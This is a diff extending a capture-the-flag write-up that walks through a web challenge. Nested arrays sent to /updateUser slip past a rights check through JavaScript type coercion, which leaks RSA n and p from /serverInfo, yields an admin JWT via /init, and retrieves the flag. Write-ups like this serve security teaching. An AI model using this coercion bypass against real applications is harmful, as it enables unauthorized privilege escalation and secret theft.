@@ -56,7 +56,7 @@ The default rights for each user are:
 
 `[ "message", "height", "width", "version", "usersOnline", "adminUsername", "backgroundColor" ]`
 
-We need to add `n` and `p` to our users rights.
+We need to add `n` and `p` to our users' rights list.
 
 The method `/updateUser` allows us to send a list of rights to add to our users rights list.
 
@@ -129,3 +129,138 @@ we get the following JWT:
 ```
 
 Now we can update our rights!
+
+
+But if we try to POST `["p", "n"]` to `/updateUser` we get:
+
+```javascript
+{
+    "status": "ok",
+    "data": {
+        "user": {
+            "username": "hacKtm",
+            "id": "fb74f5bf-24e4-48d0-a68f-aacdb335116a",
+            "color": 0,
+            "rights": [
+                "message",
+                "height",
+                "width",
+                "version",
+                "usersOnline",
+                "adminUsername",
+                "backgroundColor"
+            ]
+        }
+    }
+}
+```
+
+We didn't get an error! But `n` and `p` weren't added to the list.
+
+That's because of `checkRights(arr)`.
+
+## Bypassing checkRights(arr)
+
+In `/updateUser()`:
+```javascript
+if (rights.length > 0 && checkRights(rights)) {
+   users[uid].rights = user.rights.concat(rights).filter(onlyUnique);
+}
+```
+
+and `checkRights` returns false because `rights` contains the string `"n"/"p"`.
+
+This took me a long time to solve. But this can be solved given two facts:
+
+1. Javascript uses `toString()` to access object's properties.
+2. An array with one element's `toString()` is `toString()` of the element. Ex: ["n"].toString() => "n".
+
+When we POST `[["p"], ["n"]]` to `/updateUser` we get:
+
+```javascript
+{
+    "status": "ok",
+    "data": {
+        "user": {
+            "username": "hacKtm",
+            "id": "fb74f5bf-24e4-48d0-a68f-aacdb335116a",
+            "color": 0,
+            "rights": [
+                "message",
+                "height",
+                "width",
+                "version",
+                "usersOnline",
+                "adminUsername",
+                "backgroundColor",
+                [
+                    "p"
+                ],
+                [
+                    "n"
+                ]
+            ]
+        }
+    }
+}
+```
+
+The output of `/serverInfo` is:
+
+```javascript
+{
+    "status": "ok",
+    "data": {
+        "info": [
+            ...
+            {
+                "name": [
+                    "n"
+                ],
+                "value": "54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979"
+            },
+            {
+                "name": [
+                    "p"
+                ],
+                "value": "192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617"
+            }
+        ]
+    }
+}
+```
+
+## Getting the flag
+
+
+
+Compute `q` using `n/p`  we obtain:
+
+`q =  283463585975138667365296941492014484422030788964145259030277643596460860183630041214426435642097873422136064628904111949258895415157497887086501927987`
+
+POST `p` and `q` to `/init` and get:
+
+```javascript
+{
+    "status": "ok",
+    "data": {
+        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNzYzMDEzfQ._6WxROQi7O2EtsTP_gIVCfexZdswjR-2VsN4Biq10g8"
+    }
+}
+```
+
+`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNzYzMDEzfQ._6WxROQi7O2EtsTP_gIVCfexZdswjR-2VsN4Biq10g8` is the admin's token.
+
+GET `/flag` with the admin's token:
+
+```
+{
+    "status": "ok",
+    "data": {
+        "flag": "HackTM{Draw_m3_like_0ne_of_y0ur_japan3se_girls}"
+    }
+}
+```
+
+Submit the flag and get the points!
+
